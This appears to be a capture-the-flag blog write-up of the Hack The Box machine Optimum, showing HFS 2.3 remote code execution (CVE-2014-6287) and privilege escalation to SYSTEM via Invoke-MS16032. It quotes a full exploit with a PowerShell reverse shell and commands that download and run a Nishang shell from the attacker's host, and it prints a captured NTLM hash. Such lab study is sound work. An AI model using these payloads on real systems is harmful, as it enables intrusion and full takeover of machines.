---
layout: post
title: "HTB: OPTIMUM (10.10.10.8)"
description: "Optimum is an easy rated windows box from Hack The Box. It runs a vulnerable version of HttpFileServer which is just a free web server specifically designed for publishing and sharing files. For the Privesc I Will exploit MS16-098 to gain administrative privileges on the box."
tags: [HTB, HackTheBox, powershell, optimum, nishang, hfs, HttpFileServer, python, RCE, CVE-2014-6287, Server 2012, local_exploit_suggester]
image: "/assets/img/optimum/feature.png"
---
## RECON
### Nmap

As always we start off with the recon and enumeration process to get an overview of our attack surface and target's running service.


```sh
┌─[✗]─[george@parrot]─[~/HTB/boxes/optimum]
└──╼ $ cat nmap/allports.nmap
# Nmap 7.93 scan initiated Sun Oct 15 18:45:23 2023 as: nmap -p- --min-rate 10000 -oA nmap/allports 10.10.10.8
Nmap scan report for 10.10.10.8
Host is up (0.21s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

# Nmap done at Sun Oct 15 18:45:41 2023 -- 1 IP address (1 host up) scanned in 18.03 seconds
┌─[george@parrot]─[~/HTB/boxes/optimum]
└──╼ $ cat nmap/optimum.nmap
# Nmap 7.93 scan initiated Sun Oct 15 18:46:20 2023 as: nmap -p80 -sC -sV -oA nmap/optimum 10.10.10.8
Nmap scan report for 10.10.10.8
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 15 18:46:40 2023 -- 1 IP address (1 host up) scanned in 19.73 seconds

```
Only one port open (HTTP) and `nmap` says the OS is Windows.

### Port Enumeration
#### Port 80 (http)

Visiting the page I see `HttpFileServer 2.3` which is a free web server specifically designed for publishing and sharing files.

There are no default credentials hence the I will ignore the login page.

![Page 80](/assets/img/optimum/port80.png)

I will check `searchsploit` for any exploits on this version. And what do you know, several pop up

```sh
┌─[george@parrot]─[~/HTB/boxes/optimum]
└──╼ $ searchsploit hfs 2.3
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                        | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                        | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                             | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                     | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                           | windows/webapps/34852.txt
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Using the `-x` option to exermine the first RCE.

```py
# Exploit Title: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
# Google Dork: intext:"httpfileserver 2.3"
# Date: 20/02/2021
# Exploit Author: Pergyz
# Vendor Homepage: http://www.rejetto.com/hfs/
# Software Link: https://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Microsoft Windows Server 2012 R2 Standard
# CVE : CVE-2014-6287
# Reference: https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands

#!/usr/bin/python3

import base64
import os
import urllib.request
import urllib.parse

lhost = "10.10.10.1"
lport = 1111
rhost = "10.10.10.8"
rport = 80

# Define the command to be written to a file
command = f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()'

# Encode the command in base64 format
encoded_command = base64.b64encode(command.encode("utf-16le")).decode()
print("\nEncoded the command in base64 format...")

# Define the payload to be included in the URL
payload = f'exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}'

# Encode the payload and send a HTTP GET request
encoded_payload = urllib.parse.quote_plus(payload)
url = f'http://{rhost}:{rport}/?search=%00{{.{encoded_payload}.}}'
urllib.request.urlopen(url)
print("\nEncoded the payload and sent a HTTP GET request to the target...")

# Print some information
print("\nPrinting some information for debugging...")
print("lhost: ", lhost)
print("lport: ", lport)
print("rhost: ", rhost)
print("rport: ", rport)
print("payload: ", payload)

# Listen for connections
print("\nListening for connection...")
os.system(f'nc -nlvp {lport}')
```
This looks like it was created just for this box. Running this will definatly get me a shell, I just need to change the `lhost`. But nope I dont want the easy way out so I will take the `CVE-2014-6287` and try this the manual way.

## Shell as kostas
### Enumeration
#### CVE-2014-6287

The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server (aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action.

Taking this into consideration, I will test out this `RCE` using burp. First I needed to understand how `HFS` executes commands.

![HFS Command Execution](/assets/img/optimum/exec_command.png)

Awesome, putting all this together, I will try pinging my box from `optimum`

![Testing RCE](/assets/img/optimum/testing_rce.png)

And we get a call back. Awesome so we have `RCE`

```sh
┌─[george@parrot]─[~/HTB/boxes/optimum]
└──╼ $ sudo tcpdump -i tun0
[sudo] password for george:
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:57:56.181643 IP 10.10.16.7.52696 > 10.10.10.8.http: Flags [S], seq 1083679307, win 64240, options [mss 1460,sackOK,TS val 516027120 ecr 0,nop,wscale 7], length 0
14:57:56.383753 IP 10.10.10.8.http > 10.10.16.7.52696: Flags [S.], seq 1213840787, ack 1083679308, win 8192, options [mss 1358,nop,wscale 8,sackOK,TS val 73598 ecr 516027120], length 0
14:57:56.383791 IP 10.10.16.7.52696 > 10.10.10.8.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 516027323 ecr 73598], length 0
14:57:56.384590 IP 10.10.16.7.52696 > 10.10.10.8.http: Flags [P.], seq 1:449, ack 1, win 502, options [nop,nop,TS val 516027323 ecr 73598], length 448: HTTP: GET /?search=%00{.{exec|ping+10.10.16.7}.} HTTP/1.1
14:57:56.863005 IP 10.10.10.8.http > 10.10.16.7.52696: Flags [P.], seq 1:194, ack 449, win 257, options [nop,nop,TS val 73644 ecr 516027323], length 193: HTTP: HTTP/1.1 200 OK
14:57:56.863067 IP 10.10.16.7.52696 > 10.10.10.8.http: Flags [.], ack 194, win 501, options [nop,nop,TS val 516027802 ecr 73644], length 0
14:57:57.064227 IP 10.10.10.8.http > 10.10.16.7.52696: Flags [.], seq 194:1540, ack 449, win 257, options [nop,nop,TS val 73644 ecr 516027323], length 1346: HTTP
14:57:57.064278 IP 10.10.16.7.52696 > 10.10.10.8.http: Flags [.], ack 1540, win 501, options [nop,nop,TS val 516028003 ecr 73644], length 0
14:57:57.064322 IP 10.10.10.8.http > 10.10.16.7.52696: Flags [P.], seq 1540:1654, ack 449, win 257, options [nop,nop,TS val 73644 ecr 516027323], length 114: HTTP
14:57:57.064332 IP 10.10.16.7.52696 > 10.10.10.8.http: Flags [.], ack 1654, win 501, options [nop,nop,TS val 516028003 ecr 73644], length 0
14:57:57.064393 IP 10.10.10.8.http > 10.10.16.7.52696: Flags [P.], seq 1654:1962, ack 449, win 257, options [nop,nop,TS val 73644 ecr 516027323], length 308: HTTP
14:57:57.064405 IP 10.10.16.7.52696 > 10.10.10.8.http: Flags [.], ack 1962, win 499, options [nop,nop,TS val 516028003 ecr 73644], length 0
14:57:57.064429 IP 10.10.10.8.http > 10.10.16.7.52696: Flags [F.], seq 1962, ack 449, win 257, options [nop,nop,TS val 73644 ecr 516027323], length 0
14:57:57.067712 IP 10.10.16.7.52696 > 10.10.10.8.http: Flags [F.], seq 449, ack 1963, win 501, options [nop,nop,TS val 516028006 ecr 73644], length 0
```
### Initial foothold

I will copy [nishang](https://github.com/samratashok/nishang) shell `Invoke-PowerShellTcp.ps1` to my current directory.

```sh
┌─[george@parrot]─[~/HTB/boxes/optimum]
└──╼ $ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
```
and change the below line to match my IP and port

```sh
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.7 -Port 9001
```
Then I will change the file name to a simple `shell.ps1` and host it using `python3`

```sh
┌─[george@parrot]─[~/HTB/boxes/optimum/www]
└──╼ $ sudo python3 -m http.server 80
[sudo] password for george:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

On my browser, I will issue below command which is already `url` encoded `powershell` command

```php
C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.Webclient).downloadString('http%3a//10.10.16.7%3a80/shell.ps1'
```
![Shell](/assets/img/optimum/shell.png)

When I click send, I see it grabbing the file from my box, not sure why it made those many requests.

```
┌─[george@parrot]─[~/HTB/boxes/optimum/www]
└──╼ $ sudo python3 -m http.server 80
[sudo] password for george:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.8 - - [17/Oct/2023 19:02:57] "GET /shell.ps1 HTTP/1.1" 200 -
10.10.10.8 - - [17/Oct/2023 19:02:57] "GET /shell.ps1 HTTP/1.1" 200 -
10.10.10.8 - - [17/Oct/2023 19:02:57] "GET /shell.ps1 HTTP/1.1" 200 -
10.10.10.8 - - [17/Oct/2023 19:02:57] "GET /shell.ps1 HTTP/1.1" 200 -
```

And we have a foothold on the box

```
┌─[george@parrot]─[~/HTB]
└──╼ $ rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.8] 49162
Windows PowerShell running as user kostas on OPTIMUM
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

dir


    Directory: C:\Users\kostas\Desktop


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
-a---         18/3/2017   2:11 ??     760320 hfs.exe                                                                   
-ar--        23/10/2023  11:45 ??         34 user.txt                                                                  


PS C:\Users\kostas\Desktop>
```

## Shell as nt authority\system
### Enumeration

Looking at the systeminfo, I see several patches implimented and also note the box is a windows server 2012. I also note it is a 64bit OS.

```powershell
Host Name:                 OPTIMUM                                                                                                                                                                                                                            
OS Name:                   Microsoft Windows Server 2012 R2 Standard                                                                                                                                                                                          
OS Version:                6.3.9600 N/A Build 9600                                                                                                                                                                                                            
OS Manufacturer:           Microsoft Corporation                                                                                                                                                                                                              
OS Configuration:          Standalone Server                                                                                                                                                                                                                  
OS Build Type:             Multiprocessor Free                                                                                                                                                                                                                
Registered Owner:          Windows User                                                                                                                                                                                                                       
Registered Organization:                                                                                                                                                                                                                                      
Product ID:                00252-70000-00000-AA535                                                                                                                                                                                                            
Original Install Date:     18/3/2017, 1:51:36 ??                                                                                                                                                                                                              
System Boot Time:          22/10/2023, 3:41:36 ??                                                                                                                                                                                                             
System Manufacturer:       VMware, Inc.                                                                                                                                                                                                                       
System Model:              VMware Virtual Platform                                                                                                                                                                                                            
System Type:               x64-based PC                                                                                                                                                                                                                       
Processor(s):              1 Processor(s) Installed.           
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz                                   
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018                                                           
Windows Directory:         C:\Windows                          
System Directory:          C:\Windows\system32                 
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek                                                                                            
Input Locale:              en-us;English (United States)       
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB                            
Available Physical Memory: 3.476 MB                                                                                            
Virtual Memory: Max Size:  5.503 MB                            
Virtual Memory: Available: 4.907 MB       
Virtual Memory: In Use:    596 MB                              
Page File Location(s):     C:\pagefile.sys                     
Domain:                    HTB                     
Logon Server:              \\OPTIMUM                           
Hotfix(s):                 31 Hotfix(s) Installed.                                                                                                                                                                                                            
                           [01]: KB2959936                                                                                                                                                                                                                    
                           [02]: KB2896496                                                                                                                                                                                                                    
                           [03]: KB2919355                                                                                                                                                                                                                    
                           [04]: KB2920189                                                                                                                                                                                                                    
                           [05]: KB2928120                                                                                                                                                                                                                    
                           [06]: KB2931358                     
                           [07]: KB2931366                     
                           [08]: KB2933826                     
                           [09]: KB2938772                     
                           [10]: KB2949621               
                           [11]: KB2954879                     
                           [12]: KB2958262                     
                           [13]: KB2958263                     
                           [14]: KB2961072
                           [15]: KB2965500                     
                           [16]: KB2966407                     
                           [17]: KB2967917                                                                                     
                           [18]: KB2971203                                                                                     
                           [19]: KB2971850                                                                                     
                           [20]: KB2973351                                                                                     
                           [21]: KB2973448                     
                           [22]: KB2975061                     
                           [23]: KB2976627      
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection                                                    
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
I will save this to a file and feed it to the `windows-exploit-suggester.py` to see if we can find any privesc path.

I will also look at the privileges assigned to our user and see if anything stands out

```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
PS C:\Users\kostas\Desktop>
```
Nothing much to see here. Back to `windows-exploit-suggester.py` , I see several path. I will test this out and see which one works.

```
┌─[✗]─[george@parrot]─[~/HTB/boxes/optimum/priv]                                                                               
└──╼ $ python windows-exploit-suggester.py --database 2023-10-16-mssb.xls --systeminfo systeminfo.txt                                  
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension                                                                   
[*] attempting to read from the systeminfo input file                                                                          
[+] systeminfo input file read successfully (utf-8)                                                                                                                                                                                                           
[*] querying database file for potential vulnerabilities                                                                       
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns                                                                                          
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin                                                                                                                                                                                            
[+] windows version identified as 'Windows 2012 R2 64-bit'                                                                     
[*]
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important                        
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255                                      
[*]                                                                                                                            
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*]                                                                                                                            
==================snip=======================
[*] done
```

I did a little research on the first one but it did not sound useful. On to the next one `MS16-098` stands out as from my research I note it also affect windows server 2012.

I read  bit about this exploit and discovered the initial exploit worked by poping another window rather than giving you options to run commands. But unless I activate a remote desktop on this box I wouldnt be able to know if it worked and even if it worked I wouldnt be able to catch that window. I almost gave up on this but luckily I came across [this empire](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1) script which allows you to run any command as system. Sweet!

### Some Setbacks(Learning Moment)

I had a hard time initially trying to get this to work as it kept failing no matter what I did. Trust me when I say i spent 2 good days on this privesc. I had to take a pause and go over powershell basics. I realised When I got my foothold, I did in a 32 bit shell. The exploit I was trying to run was a 64bit and couldnt run on a 32bit shell. This made me go back and get a 64bit shell using C:\Windows\SysNative\ which holds the 64bit binaries. One thing I learnt is `C:\Windows\System32` and `C:\Windows\SysWow64` all hold 32bit binaries.


### Privilege Escalation

I will download it on my box and host an `smbserver` using impacket, then download the file to `optimum` box.

```
┌─[george@parrot]─[~/HTB/boxes/optimum/share]                                                                                                                                                                                                                 └──╼ $ sudo impacket-smbserver smbfolder $(pwd)       
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed              
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed                                         
[*] Config file parsed
[*] Config file parsed
[-] TreeConnectAndX not found SMBSERVER
[-] TreeConnectAndX not found SMBSERVER
[*] Disconnecting Share(1:IPC$)
[*] Closing down connection (10.10.10.8,49205)
[*] Remaining connections []                                   
[*] Incoming connection (10.10.10.8,49206)
[*] AUTHENTICATE_MESSAGE (OPTIMUM\kostas,OPTIMUM)
[*] User OPTIMUM\kostas authenticated successfully
[*] kostas::OPTIMUM:aaaaaaaaaaaaaaaa:cbd04baed8fe317703535661c3ef3a26:01010000000000008037337c2501da015386942160da49be00000000010010004e0045006e00780057004a004b006100030010004e0045006e00780057004a004b006100020010006a0058005a004800590070007500660004001000
6a0058005a0048005900700075006600070008008037337c2501da01060004000200000008003000300000000000000000000000002000004cadb052479d75c441869d5162b9c585eeb2c773dc0d66f979c366c86ad129160a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e
00310030002e00310036002e003700000000000000000000000000
```
On `optimum` I will use the copy command.

```
copy //10.10.16.7/smbfolder/ms16-098.ps1 .                                                                                                                                                                                                                    
dir                                                                                                                                                                                                                                                           


    Directory: C:\Users\kostas\Desktop                                                                                                                                                                                                                        


Mode                LastWriteTime     Length Name                                                                                                                                                                                                             
----                -------------     ------ ----                                                                                                                                                                                                             
-a---        17/10/2023   9:10 ??       4005 bfill.exe                                                                                                                                                                                                        
-a---         18/3/2017   2:11 ??     760320 hfs.exe                                                                                                                                                                                                          
-a---        17/10/2023  11:18 ??      13789 ms16-098.ps1                                                                                                                                                                                                     
-a---        17/10/2023   8:00 ??     560128 priv.exe                                                                                                                                                                                                         
-ar--        23/10/2023  11:45 ??         34 user.txt
```
Once on `optimum` I will Import the function `Invoke-MS16032` from the `MS16-098.ps1` script. Point to remeber, always use `.\yourscript.ps1` when importing a module to powershell, learnt it the hadrway :)

```powershell
import-module .\ms16-098.ps1
```

On my other terminal, I will host the same `nishang` script I used to get a foothold but change the port to `9002`.

Once done I will execute below command on `optimum`

```powershell
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.16.7/shell.ps1')"
```
This will reach out to my box and download and execute shell.ps1 which has my reverse shell.

```
┌─[george@parrot]─[~/HTB/boxes/optimum/www]
└──╼ $ sudo python3 -m http.server 80
[sudo] password for george:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.8 - - [17/Oct/2023 23:52:32] "GET /shell.ps1 HTTP/1.1" 200 -
```

The terminal on `optimum` hangs and boom we get below

```
__ __ ___ ___   ___     ___ ___ ___
|  V  |  _|_  | |  _|___|   |_  |_  |
|     |_  |_| |_| . |___| | |_  |  _|
|_|_|_|___|_____|___|   |___|___|___|

[by b33f -> @FuzzySec]

[!] Holy handle leak Batman, we have a SYSTEM shell!!

PS C:\Users\kostas\Desktop>

```

Also am listening on port `9002` on another terminal and I can see a connection. And we are root.

```
┌─[george@parrot]─[~/HTB/boxes/optimum/share]
└──╼ $ nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.8] 49243
Windows PowerShell running as user OPTIMUM$ on OPTIMUM
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\kostas\Desktop>whoami  
nt authority\system
PS C:\Users\kostas\Desktop>
```

And thats the box. Thank you all for taking your time to read my blog post, stay tuned for the next!
Happy hacking!
